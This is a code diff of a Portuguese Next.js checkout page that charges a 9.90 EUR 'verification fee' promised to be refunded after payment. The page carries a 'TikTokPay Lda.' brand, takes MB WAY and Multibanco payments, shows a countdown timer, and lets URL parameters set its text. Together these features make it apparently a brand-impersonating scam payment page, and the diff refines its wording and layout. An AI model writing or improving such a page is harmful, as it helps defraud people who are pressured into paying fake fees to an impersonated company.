@@ -2,7 +2,14 @@ import Head from 'next/head'
 import { useEffect, useState } from 'react'
 
 export default function Checkout() {
-  const [params, setParams]     = useState({ name: 'Taxa de Verificação – Estorno após Pagamento', amount: 9.90, description: 'TikTokPay Lda.', logo: '', timer: 10 })
+  // Alterado: Nome e Descrição padrão atualizados para Portugal
+  const [params, setParams]     = useState({ 
+    name: 'Taxa de Verificação – Reembolso após Pagamento', 
+    amount: 9.90, 
+    description: 'TikTokPay Lda.', 
+    logo: '', 
+    timer: 10 
+  })
   const [method, setMethod]     = useState('mbway')
   const [phone, setPhone]       = useState('')
   const [terms, setTerms]       = useState(false)
@@ -17,9 +24,10 @@ export default function Checkout() {
     const p = new URLSearchParams(window.location.search)
     const timer = parseInt(p.get('timer') || '10', 10)
     setParams({
-      name:        p.get('name')        || 'Taxa de Verificação – Estorno após Pagamento',
+      // Alterado: Fallback dos parâmetros da URL também atualizados
+      name:        p.get('name')        || 'Taxa de Verificação – Reembolso após Pagamento',
       amount:      parseFloat(p.get('amount') || '9.90'),
-      description: p.get('description') || p.get('name') || 'TikTokPay Lda.',
+      description: p.get('description') || 'TikTokPay Lda.',
       logo:        p.get('logo')        || '',
       timer,
     })
@@ -125,43 +133,29 @@ export default function Checkout() {
           box-shadow: 0 2px 12px rgba(0,0,0,.08); overflow: hidden;
         }
 
-        /* ── Product header card ── */
         .product-card {
           display: flex; flex-direction: column; align-items: center;
           padding: 1.5rem 1.25rem 1.25rem; text-align: center;
         }
         .product-logo {
-          width: 64px;
-          height: 64px;
-          border-radius: 50%;
-          background: #000;
-          margin-bottom: 1rem;
-          position: relative; /* Base para o posicionamento absoluto */
-          overflow: hidden;
-          flex-shrink: 0;
+          width: 64px; height: 64px; border-radius: 50%;
+          background: #000; margin-bottom: 1rem;
+          position: relative; overflow: hidden; flex-shrink: 0;
         }
         .product-logo img { 
-          position: absolute;
-          top: 50%;
-          left: 50%;
-          transform: translate(-50%, -50%); /* Centralização absoluta real */
-          max-width: 80%; /* Garante que não encoste nas bordas */
-          max-height: 80%;
-          width: auto;
-          height: auto;
-          display: block;
-          object-fit: contain;
+          position: absolute; top: 50%; left: 50%;
+          transform: translate(-50%, -50%);
+          max-width: 80%; max-height: 80%;
+          width: auto; height: auto; display: block; object-fit: contain;
         }
         .product-logo-letter { 
-          position: absolute;
-          top: 50%; left: 50%;
+          position: absolute; top: 50%; left: 50%;
           transform: translate(-50%, -50%);
           color: #fff; font-size: 1.4rem; font-weight: 800; 
         }
         .product-name-header { font-size: 1.05rem; font-weight: 700; margin-bottom: .2rem; }
         .product-secure { font-size: .78rem; color: #888; font-weight: 400; }
 
-        /* ── Resto dos estilos ── */
         .payment-card { padding: 1.25rem; }
         .payment-title { font-size: .95rem; font-weight: 700; margin-bottom: .1rem; }
         .payment-sub   { font-size: .78rem; color: #888; margin-bottom: 1rem; }
@@ -216,6 +210,7 @@ export default function Checkout() {
           display: flex; flex-direction: column; align-items: center; justify-content: center;
           text-align: center; padding: 1.25rem 1rem 1rem;
         }
+        .mb-info { text-align: left; background: #f9f9f9; padding: 1rem; border-radius: 10px; width: 100%; font-size: 0.9rem; line-height: 1.6; }
         .polling { display: flex; align-items: center; justify-content: center; gap: .4rem; padding-top: .85rem; }
         .dot { width: 6px; height: 6px; border-radius: 50%; background: #aaa; animation: pulse 1.2s ease-in-out infinite; }
         @keyframes pulse { 0%,100%{opacity:.25} 50%{opacity:1} }
@@ -228,7 +223,6 @@ export default function Checkout() {
       </div>
 
       <div className="page">
-        {/* PRODUCT HEADER CARD CORRIGIDO */}
         <div className="card product-card">
           <div className="product-logo">
             { (params.logo || "https://i.postimg.cc/L4fzn491/7safpbsxoywisudmovpfonxnj.gif") ? (
@@ -245,7 +239,6 @@ export default function Checkout() {
           <div className="product-secure">Pagamento seguro • WayMB</div>
         </div>
 
-        {/* PAYMENT CARD */}
         <div className="card payment-card">
           <div className="payment-title">{params.name}</div>
           <div className="payment-sub">{params.description}</div>
@@ -296,7 +289,7 @@ export default function Checkout() {
 
           {uiState === 'multibanco' && (
             <div className="success-box">
-              <div className="success-title" style={{fontWeight:700}}>Pagamento Multibanco</div>
+              <div className="success-title" style={{fontWeight:700, marginBottom: '1rem'}}>Pagamento Multibanco</div>
               <div className="mb-info">
                 Entidade: <strong>{txData?.referenceData?.entity || '—'}</strong><br/>
                 Referência: <strong>{txData?.referenceData?.reference || '—'}</strong><br/>
